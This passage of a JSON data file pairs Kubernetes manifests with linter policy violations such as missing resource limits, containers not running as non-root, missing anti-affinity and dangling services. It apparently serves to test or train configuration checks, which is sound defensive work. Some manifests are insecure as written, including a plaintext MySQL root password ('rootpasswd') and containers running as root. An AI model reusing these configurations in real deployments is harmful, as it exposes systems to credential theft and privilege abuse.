    "id": "11642",
    "manifest_path": "data/manifests/the_stack_sample/sample_4489.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: my-deployment\n  labels:\n    app: goproxy\nspec:\n  selector:\n    matchLabels:\n      app: goproxy\n  template:\n    metadata:\n      name: goproxy\n      labels:\n        app: goproxy\n    spec:\n      containers:\n      - name: mysql\n        image: mysql\n        env:\n        - name: MYSQL_ROOT_PASSWORD\n          value: rootpasswd\n      - name: php\n        image: php:7.0-apache\n        volumeMounts:\n        - mountPath: /var/www/html\n          name: site-data\n          subPath: html\n      volumes:\n      - name: site-data\n        persistentVolumeClaim:\n          claimName: my-lamp-site-data\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"mysql\" has memory limit 0"
  },
  {
    "id": "11643",
    "manifest_path": "data/manifests/the_stack_sample/sample_4489.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: my-deployment\n  labels:\n    app: goproxy\nspec:\n  selector:\n    matchLabels:\n      app: goproxy\n  template:\n    metadata:\n      name: goproxy\n      labels:\n        app: goproxy\n    spec:\n      containers:\n      - name: mysql\n        image: mysql\n        env:\n        - name: MYSQL_ROOT_PASSWORD\n          value: rootpasswd\n      - name: php\n        image: php:7.0-apache\n        volumeMounts:\n        - mountPath: /var/www/html\n          name: site-data\n          subPath: html\n      volumes:\n      - name: site-data\n        persistentVolumeClaim:\n          claimName: my-lamp-site-data\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"php\" has memory limit 0"
  },
  {
    "id": "11644",
    "manifest_path": "data/manifests/the_stack_sample/sample_4490.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: echo-v1\n  labels:\n    app: echo\n    version: v1\nspec:\n  selector:\n    matchLabels:\n      app: echo\n      version: v1\n  template:\n    metadata:\n      labels:\n        app: echo\n        version: v1\n    spec:\n      containers:\n      - name: echo\n        image: jxlwqq/http-echo\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 8080\n        args:\n        - --text=v1\n        readinessProbe:\n          httpGet:\n            path: /health\n            port: 8080\n        livenessProbe:\n          httpGet:\n            path: /health\n            port: 8080\n        resources:\n          requests:\n            cpu: 100m\n            memory: 100Mi\n          limits:\n            cpu: 100m\n            memory: 100Mi\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"echo\" is using an invalid container image, \"jxlwqq/http-echo\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "11645",
    "manifest_path": "data/manifests/the_stack_sample/sample_4490.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: echo-v1\n  labels:\n    app: echo\n    version: v1\nspec:\n  selector:\n    matchLabels:\n      app: echo\n      version: v1\n  template:\n    metadata:\n      labels:\n        app: echo\n        version: v1\n    spec:\n      containers:\n      - name: echo\n        image: jxlwqq/http-echo\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 8080\n        args:\n        - --text=v1\n        readinessProbe:\n          httpGet:\n            path: /health\n            port: 8080\n        livenessProbe:\n          httpGet:\n            path: /health\n            port: 8080\n        resources:\n          requests:\n            cpu: 100m\n            memory: 100Mi\n          limits:\n            cpu: 100m\n            memory: 100Mi\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"echo\" does not have a read-only root file system"
  },
  {
    "id": "11646",
    "manifest_path": "data/manifests/the_stack_sample/sample_4490.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: echo-v1\n  labels:\n    app: echo\n    version: v1\nspec:\n  selector:\n    matchLabels:\n      app: echo\n      version: v1\n  template:\n    metadata:\n      labels:\n        app: echo\n        version: v1\n    spec:\n      containers:\n      - name: echo\n        image: jxlwqq/http-echo\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 8080\n        args:\n        - --text=v1\n        readinessProbe:\n          httpGet:\n            path: /health\n            port: 8080\n        livenessProbe:\n          httpGet:\n            path: /health\n            port: 8080\n        resources:\n          requests:\n            cpu: 100m\n            memory: 100Mi\n          limits:\n            cpu: 100m\n            memory: 100Mi\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"echo\" is not set to runAsNonRoot"
  },
  {
    "id": "11647",
    "manifest_path": "data/manifests/the_stack_sample/sample_4491.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: ms-images\nspec:\n  type: NodePort\n  ports:\n  - port: 80\n    protocol: TCP\n    targetPort: 80\n  selector:\n    app: ms-images\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:ms-images])"
  },
  {
    "id": "11648",
    "manifest_path": "data/manifests/the_stack_sample/sample_4493.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: hook\n  labels:\n    app: hook\nspec:\n  replicas: 4\n  selector:\n    matchLabels:\n      app: hook\n  template:\n    metadata:\n      labels:\n        app: hook\n    spec:\n      containers:\n      - name: hook\n        image: gcr.io/k8s-prow/hook:v20191211-cf6fb4d2b\n        imagePullPolicy: Always\n        args:\n        - --dry-run=false\n        - --slack-token-file=/etc/slack/token\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --config-path=/etc/config/config.yaml\n        - --job-config-path=/etc/job-config\n        ports:\n        - name: http\n          containerPort: 8888\n        volumeMounts:\n        - name: slack\n          mountPath: /etc/slack\n        - name: hmac\n          mountPath: /etc/webhook\n          readOnly: true\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: plugins\n          mountPath: /etc/plugins\n          readOnly: true\n        - name: cat-api\n          mountPath: /etc/cat-api\n          readOnly: true\n        - name: unsplash-api\n          mountPath: /etc/unsplash-api\n          readOnly: true\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n          initialDelaySeconds: 3\n          periodSeconds: 3\n        readinessProbe:\n          httpGet:\n            path: /healthz/ready\n            port: 8081\n          initialDelaySeconds: 10\n          periodSeconds: 3\n          timeoutSeconds: 600\n      volumes:\n      - name: slack\n        secret:\n          secretName: slack-token\n      - name: hmac\n        secret:\n          secretName: hmac-token\n      - name: oauth\n        secret:\n          secretName: oauth-token\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n      - name: plugins\n        configMap:\n          name: plugins\n      - name: cat-api\n        configMap:\n          name: cat-api-key\n      - name: unsplash-api\n        secret:\n          secretName: unsplash-api-key\n",
    "policy_id": "liveness-port",
    "violation_text": "container \"hook\" does not expose port 8081 for the HTTPGet"
  },
  {
    "id": "11649",
    "manifest_path": "data/manifests/the_stack_sample/sample_4493.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: hook\n  labels:\n    app: hook\nspec:\n  replicas: 4\n  selector:\n    matchLabels:\n      app: hook\n  template:\n    metadata:\n      labels:\n        app: hook\n    spec:\n      containers:\n      - name: hook\n        image: gcr.io/k8s-prow/hook:v20191211-cf6fb4d2b\n        imagePullPolicy: Always\n        args:\n        - --dry-run=false\n        - --slack-token-file=/etc/slack/token\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --config-path=/etc/config/config.yaml\n        - --job-config-path=/etc/job-config\n        ports:\n        - name: http\n          containerPort: 8888\n        volumeMounts:\n        - name: slack\n          mountPath: /etc/slack\n        - name: hmac\n          mountPath: /etc/webhook\n          readOnly: true\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: plugins\n          mountPath: /etc/plugins\n          readOnly: true\n        - name: cat-api\n          mountPath: /etc/cat-api\n          readOnly: true\n        - name: unsplash-api\n          mountPath: /etc/unsplash-api\n          readOnly: true\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n          initialDelaySeconds: 3\n          periodSeconds: 3\n        readinessProbe:\n          httpGet:\n            path: /healthz/ready\n            port: 8081\n          initialDelaySeconds: 10\n          periodSeconds: 3\n          timeoutSeconds: 600\n      volumes:\n      - name: slack\n        secret:\n          secretName: slack-token\n      - name: hmac\n        secret:\n          secretName: hmac-token\n      - name: oauth\n        secret:\n          secretName: oauth-token\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n      - name: plugins\n        configMap:\n          name: plugins\n      - name: cat-api\n        configMap:\n          name: cat-api-key\n      - name: unsplash-api\n        secret:\n          secretName: unsplash-api-key\n",
    "policy_id": "no-anti-affinity",
    "violation_text": "object has 4 replicas but does not specify inter pod anti-affinity"
  },
  {
    "id": "11650",
    "manifest_path": "data/manifests/the_stack_sample/sample_4493.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: hook\n  labels:\n    app: hook\nspec:\n  replicas: 4\n  selector:\n    matchLabels:\n      app: hook\n  template:\n    metadata:\n      labels:\n        app: hook\n    spec:\n      containers:\n      - name: hook\n        image: gcr.io/k8s-prow/hook:v20191211-cf6fb4d2b\n        imagePullPolicy: Always\n        args:\n        - --dry-run=false\n        - --slack-token-file=/etc/slack/token\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --config-path=/etc/config/config.yaml\n        - --job-config-path=/etc/job-config\n        ports:\n        - name: http\n          containerPort: 8888\n        volumeMounts:\n        - name: slack\n          mountPath: /etc/slack\n        - name: hmac\n          mountPath: /etc/webhook\n          readOnly: true\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: plugins\n          mountPath: /etc/plugins\n          readOnly: true\n        - name: cat-api\n          mountPath: /etc/cat-api\n          readOnly: true\n        - name: unsplash-api\n          mountPath: /etc/unsplash-api\n          readOnly: true\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n          initialDelaySeconds: 3\n          periodSeconds: 3\n        readinessProbe:\n          httpGet:\n            path: /healthz/ready\n            port: 8081\n          initialDelaySeconds: 10\n          periodSeconds: 3\n          timeoutSeconds: 600\n      volumes:\n      - name: slack\n        secret:\n          secretName: slack-token\n      - name: hmac\n        secret:\n          secretName: hmac-token\n      - name: oauth\n        secret:\n          secretName: oauth-token\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n      - name: plugins\n        configMap:\n          name: plugins\n      - name: cat-api\n        configMap:\n          name: cat-api-key\n      - name: unsplash-api\n        secret:\n          secretName: unsplash-api-key\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"hook\" does not have a read-only root file system"
  },
  {
    "id": "11651",
    "manifest_path": "data/manifests/the_stack_sample/sample_4493.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: hook\n  labels:\n    app: hook\nspec:\n  replicas: 4\n  selector:\n    matchLabels:\n      app: hook\n  template:\n    metadata:\n      labels:\n        app: hook\n    spec:\n      containers:\n      - name: hook\n        image: gcr.io/k8s-prow/hook:v20191211-cf6fb4d2b\n        imagePullPolicy: Always\n        args:\n        - --dry-run=false\n        - --slack-token-file=/etc/slack/token\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --config-path=/etc/config/config.yaml\n        - --job-config-path=/etc/job-config\n        ports:\n        - name: http\n          containerPort: 8888\n        volumeMounts:\n        - name: slack\n          mountPath: /etc/slack\n        - name: hmac\n          mountPath: /etc/webhook\n          readOnly: true\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: plugins\n          mountPath: /etc/plugins\n          readOnly: true\n        - name: cat-api\n          mountPath: /etc/cat-api\n          readOnly: true\n        - name: unsplash-api\n          mountPath: /etc/unsplash-api\n          readOnly: true\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n          initialDelaySeconds: 3\n          periodSeconds: 3\n        readinessProbe:\n          httpGet:\n            path: /healthz/ready\n            port: 8081\n          initialDelaySeconds: 10\n          periodSeconds: 3\n          timeoutSeconds: 600\n      volumes:\n      - name: slack\n        secret:\n          secretName: slack-token\n      - name: hmac\n        secret:\n          secretName: hmac-token\n      - name: oauth\n        secret:\n          secretName: oauth-token\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n      - name: plugins\n        configMap:\n          name: plugins\n      - name: cat-api\n        configMap:\n          name: cat-api-key\n      - name: unsplash-api\n        secret:\n          secretName: unsplash-api-key\n",
    "policy_id": "readiness-port",
    "violation_text": "container \"hook\" does not expose port 8081 for the HTTPGet"
  },
  {
    "id": "11652",
    "manifest_path": "data/manifests/the_stack_sample/sample_4493.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: hook\n  labels:\n    app: hook\nspec:\n  replicas: 4\n  selector:\n    matchLabels:\n      app: hook\n  template:\n    metadata:\n      labels:\n        app: hook\n    spec:\n      containers:\n      - name: hook\n        image: gcr.io/k8s-prow/hook:v20191211-cf6fb4d2b\n        imagePullPolicy: Always\n        args:\n        - --dry-run=false\n        - --slack-token-file=/etc/slack/token\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --config-path=/etc/config/config.yaml\n        - --job-config-path=/etc/job-config\n        ports:\n        - name: http\n          containerPort: 8888\n        volumeMounts:\n        - name: slack\n          mountPath: /etc/slack\n        - name: hmac\n          mountPath: /etc/webhook\n          readOnly: true\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: plugins\n          mountPath: /etc/plugins\n          readOnly: true\n        - name: cat-api\n          mountPath: /etc/cat-api\n          readOnly: true\n        - name: unsplash-api\n          mountPath: /etc/unsplash-api\n          readOnly: true\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n          initialDelaySeconds: 3\n          periodSeconds: 3\n        readinessProbe:\n          httpGet:\n            path: /healthz/ready\n            port: 8081\n          initialDelaySeconds: 10\n          periodSeconds: 3\n          timeoutSeconds: 600\n      volumes:\n      - name: slack\n        secret:\n          secretName: slack-token\n      - name: hmac\n        secret:\n          secretName: hmac-token\n      - name: oauth\n        secret:\n          secretName: oauth-token\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n      - name: plugins\n        configMap:\n          name: plugins\n      - name: cat-api\n        configMap:\n          name: cat-api-key\n      - name: unsplash-api\n        secret:\n          secretName: unsplash-api-key\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"hook\" is not set to runAsNonRoot"
  },
  {
    "id": "11653",
    "manifest_path": "data/manifests/the_stack_sample/sample_4493.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: hook\n  labels:\n    app: hook\nspec:\n  replicas: 4\n  selector:\n    matchLabels:\n      app: hook\n  template:\n    metadata:\n      labels:\n        app: hook\n    spec:\n      containers:\n      - name: hook\n        image: gcr.io/k8s-prow/hook:v20191211-cf6fb4d2b\n        imagePullPolicy: Always\n        args:\n        - --dry-run=false\n        - --slack-token-file=/etc/slack/token\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --config-path=/etc/config/config.yaml\n        - --job-config-path=/etc/job-config\n        ports:\n        - name: http\n          containerPort: 8888\n        volumeMounts:\n        - name: slack\n          mountPath: /etc/slack\n        - name: hmac\n          mountPath: /etc/webhook\n          readOnly: true\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: plugins\n          mountPath: /etc/plugins\n          readOnly: true\n        - name: cat-api\n          mountPath: /etc/cat-api\n          readOnly: true\n        - name: unsplash-api\n          mountPath: /etc/unsplash-api\n          readOnly: true\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n          initialDelaySeconds: 3\n          periodSeconds: 3\n        readinessProbe:\n          httpGet:\n            path: /healthz/ready\n            port: 8081\n          initialDelaySeconds: 10\n          periodSeconds: 3\n          timeoutSeconds: 600\n      volumes:\n      - name: slack\n        secret:\n          secretName: slack-token\n      - name: hmac\n        secret:\n          secretName: hmac-token\n      - name: oauth\n        secret:\n          secretName: oauth-token\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n      - name: plugins\n        configMap:\n          name: plugins\n      - name: cat-api\n        configMap:\n          name: cat-api-key\n      - name: unsplash-api\n        secret:\n          secretName: unsplash-api-key\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"hook\" has cpu request 0"
  },
  {
    "id": "11654",
    "manifest_path": "data/manifests/the_stack_sample/sample_4493.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: hook\n  labels:\n    app: hook\nspec:\n  replicas: 4\n  selector:\n    matchLabels:\n      app: hook\n  template:\n    metadata:\n      labels:\n        app: hook\n    spec:\n      containers:\n      - name: hook\n        image: gcr.io/k8s-prow/hook:v20191211-cf6fb4d2b\n        imagePullPolicy: Always\n        args:\n        - --dry-run=false\n        - --slack-token-file=/etc/slack/token\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --config-path=/etc/config/config.yaml\n        - --job-config-path=/etc/job-config\n        ports:\n        - name: http\n          containerPort: 8888\n        volumeMounts:\n        - name: slack\n          mountPath: /etc/slack\n        - name: hmac\n          mountPath: /etc/webhook\n          readOnly: true\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: plugins\n          mountPath: /etc/plugins\n          readOnly: true\n        - name: cat-api\n          mountPath: /etc/cat-api\n          readOnly: true\n        - name: unsplash-api\n          mountPath: /etc/unsplash-api\n          readOnly: true\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n          initialDelaySeconds: 3\n          periodSeconds: 3\n        readinessProbe:\n          httpGet:\n            path: /healthz/ready\n            port: 8081\n          initialDelaySeconds: 10\n          periodSeconds: 3\n          timeoutSeconds: 600\n      volumes:\n      - name: slack\n        secret:\n          secretName: slack-token\n      - name: hmac\n        secret:\n          secretName: hmac-token\n      - name: oauth\n        secret:\n          secretName: oauth-token\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n      - name: plugins\n        configMap:\n          name: plugins\n      - name: cat-api\n        configMap:\n          name: cat-api-key\n      - name: unsplash-api\n        secret:\n          secretName: unsplash-api-key\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"hook\" has memory limit 0"
  },
  {
    "id": "11655",
    "manifest_path": "data/manifests/the_stack_sample/sample_4494.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: web-app-v1\n  labels:\n    app: nginx\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: web-v1\n  template:\n    metadata:\n      labels:\n        app: web-v1\n    spec:\n      containers:\n      - name: nginx\n        image: us-docker.pkg.dev/google-samples/containers/gke/hello-app:1.0\n        ports:\n        - containerPort: 8080\n",
    "policy_id": "no-anti-affinity",
    "violation_text": "object has 3 replicas but does not specify inter pod anti-affinity"
  },
  {
    "id": "11656",
    "manifest_path": "data/manifests/the_stack_sample/sample_4494.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: web-app-v1\n  labels:\n    app: nginx\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: web-v1\n  template:\n    metadata:\n      labels:\n        app: web-v1\n    spec:\n      containers:\n      - name: nginx\n        image: us-docker.pkg.dev/google-samples/containers/gke/hello-app:1.0\n        ports:\n        - containerPort: 8080\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"nginx\" does not have a read-only root file system"
  },
  {
    "id": "11657",
    "manifest_path": "data/manifests/the_stack_sample/sample_4494.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: web-app-v1\n  labels:\n    app: nginx\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: web-v1\n  template:\n    metadata:\n      labels:\n        app: web-v1\n    spec:\n      containers:\n      - name: nginx\n        image: us-docker.pkg.dev/google-samples/containers/gke/hello-app:1.0\n        ports:\n        - containerPort: 8080\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"nginx\" is not set to runAsNonRoot"
  },
  {
    "id": "11658",
    "manifest_path": "data/manifests/the_stack_sample/sample_4494.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: web-app-v1\n  labels:\n    app: nginx\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: web-v1\n  template:\n    metadata:\n      labels:\n        app: web-v1\n    spec:\n      containers:\n      - name: nginx\n        image: us-docker.pkg.dev/google-samples/containers/gke/hello-app:1.0\n        ports:\n        - containerPort: 8080\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"nginx\" has cpu request 0"
  },
  {
    "id": "11659",
    "manifest_path": "data/manifests/the_stack_sample/sample_4494.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: web-app-v1\n  labels:\n    app: nginx\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: web-v1\n  template:\n    metadata:\n      labels:\n        app: web-v1\n    spec:\n      containers:\n      - name: nginx\n        image: us-docker.pkg.dev/google-samples/containers/gke/hello-app:1.0\n        ports:\n        - containerPort: 8080\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"nginx\" has memory limit 0"
  },
  {
    "id": "11660",
    "manifest_path": "data/manifests/the_stack_sample/sample_4495.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: rabbitmq\n  labels:\n    app: rabbitmq\n    service: rabbitmq\n  namespace: sock-shop\nspec:\n  ports:\n  - name: rabbitmq\n    port: 5672\n    targetPort: rabbitmq\n  - name: epmd\n    port: 4369\n    targetPort: epmd\n  - name: management\n    port: 15672\n    targetPort: management\n  - name: dist\n    port: 25672\n    targetPort: dist\n  - port: 9090\n    name: exporter\n    targetPort: exporter\n    protocol: TCP\n  selector:\n    app: rabbitmq\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:rabbitmq])"
  },
  {
    "id": "11661",
    "manifest_path": "data/manifests/the_stack_sample/sample_4496.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: vue-storefront-api\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: vue-storefront-api\n  template:\n    metadata:\n      labels:\n        app: vue-storefront-api\n    spec:\n      containers:\n      - name: vue-storefront-api\n        image: docker.pkg.github.com/it-jonction/vue-storefront-api/vue-storefront-api:0.0.30\n        envFrom:\n        - configMapRef:\n            name: vue-storefront-api-config\n        ports:\n        - containerPort: 8080\n        volumeMounts:\n        - mountPath: /var/www/var\n          name: code\n        - mountPath: /var/www/dist\n          name: dist\n      volumes:\n      - name: code\n        emptyDir:\n          medium: Memory\n      - name: dist\n        emptyDir:\n          medium: Memory\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"vue-storefront-api\" does not have a read-only root file system"
  },
  {
    "id": "11662",
    "manifest_path": "data/manifests/the_stack_sample/sample_4496.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: vue-storefront-api\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: vue-storefront-api\n  template:\n    metadata:\n      labels:\n        app: vue-storefront-api\n    spec:\n      containers:\n      - name: vue-storefront-api\n        image: docker.pkg.github.com/it-jonction/vue-storefront-api/vue-storefront-api:0.0.30\n        envFrom:\n        - configMapRef:\n            name: vue-storefront-api-config\n        ports:\n        - containerPort: 8080\n        volumeMounts:\n        - mountPath: /var/www/var\n          name: code\n        - mountPath: /var/www/dist\n          name: dist\n      volumes:\n      - name: code\n        emptyDir:\n          medium: Memory\n      - name: dist\n        emptyDir:\n          medium: Memory\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"vue-storefront-api\" is not set to runAsNonRoot"
  },
  {
    "id": "11663",
    "manifest_path": "data/manifests/the_stack_sample/sample_4496.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: vue-storefront-api\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: vue-storefront-api\n  template:\n    metadata:\n      labels:\n        app: vue-storefront-api\n    spec:\n      containers:\n      - name: vue-storefront-api\n        image: docker.pkg.github.com/it-jonction/vue-storefront-api/vue-storefront-api:0.0.30\n        envFrom:\n        - configMapRef:\n            name: vue-storefront-api-config\n        ports:\n        - containerPort: 8080\n        volumeMounts:\n        - mountPath: /var/www/var\n          name: code\n        - mountPath: /var/www/dist\n          name: dist\n      volumes:\n      - name: code\n        emptyDir:\n          medium: Memory\n      - name: dist\n        emptyDir:\n          medium: Memory\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"vue-storefront-api\" has cpu request 0"
  },
  {
    "id": "11664",
    "manifest_path": "data/manifests/the_stack_sample/sample_4496.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: vue-storefront-api\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: vue-storefront-api\n  template:\n    metadata:\n      labels:\n        app: vue-storefront-api\n    spec:\n      containers:\n      - name: vue-storefront-api\n        image: docker.pkg.github.com/it-jonction/vue-storefront-api/vue-storefront-api:0.0.30\n        envFrom:\n        - configMapRef:\n            name: vue-storefront-api-config\n        ports:\n        - containerPort: 8080\n        volumeMounts:\n        - mountPath: /var/www/var\n          name: code\n        - mountPath: /var/www/dist\n          name: dist\n      volumes:\n      - name: code\n        emptyDir:\n          medium: Memory\n      - name: dist\n        emptyDir:\n          medium: Memory\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"vue-storefront-api\" has memory limit 0"
  },
  {
    "id": "11665",
    "manifest_path": "data/manifests/the_stack_sample/sample_4498.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: xwing\nspec:\n  selector:\n    matchLabels:\n      org: alliance\n      class: spaceship\n  replicas: 3\n  template:\n    metadata:\n      labels:\n        org: alliance\n        class: spaceship\n    spec:\n      containers:\n      - name: spaceship\n        image: docker.io/tgraf/netperf:v1.0\n        imagePullPolicy: IfNotPresent\n",
    "policy_id": "no-anti-affinity",
    "violation_text": "object has 3 replicas but does not specify inter pod anti-affinity"
  },
  {
    "id": "11666",
    "manifest_path": "data/manifests/the_stack_sample/sample_4498.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: xwing\nspec:\n  selector:\n    matchLabels:\n      org: alliance\n      class: spaceship\n  replicas: 3\n  template:\n    metadata:\n      labels:\n        org: alliance\n        class: spaceship\n    spec:\n      containers:\n      - name: spaceship\n        image: docker.io/tgraf/netperf:v1.0\n        imagePullPolicy: IfNotPresent\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"spaceship\" does not have a read-only root file system"
  },
  {
    "id": "11667",
    "manifest_path": "data/manifests/the_stack_sample/sample_4498.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: xwing\nspec:\n  selector:\n    matchLabels:\n      org: alliance\n      class: spaceship\n  replicas: 3\n  template:\n    metadata:\n      labels:\n        org: alliance\n        class: spaceship\n    spec:\n      containers:\n      - name: spaceship\n        image: docker.io/tgraf/netperf:v1.0\n        imagePullPolicy: IfNotPresent\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"spaceship\" is not set to runAsNonRoot"
  },
  {
    "id": "11668",
    "manifest_path": "data/manifests/the_stack_sample/sample_4498.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: xwing\nspec:\n  selector:\n    matchLabels:\n      org: alliance\n      class: spaceship\n  replicas: 3\n  template:\n    metadata:\n      labels:\n        org: alliance\n        class: spaceship\n    spec:\n      containers:\n      - name: spaceship\n        image: docker.io/tgraf/netperf:v1.0\n        imagePullPolicy: IfNotPresent\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"spaceship\" has cpu request 0"
  },
  {
    "id": "11669",
    "manifest_path": "data/manifests/the_stack_sample/sample_4498.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: xwing\nspec:\n  selector:\n    matchLabels:\n      org: alliance\n      class: spaceship\n  replicas: 3\n  template:\n    metadata:\n      labels:\n        org: alliance\n        class: spaceship\n    spec:\n      containers:\n      - name: spaceship\n        image: docker.io/tgraf/netperf:v1.0\n        imagePullPolicy: IfNotPresent\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"spaceship\" has memory limit 0"
  },
  {
    "id": "11670",
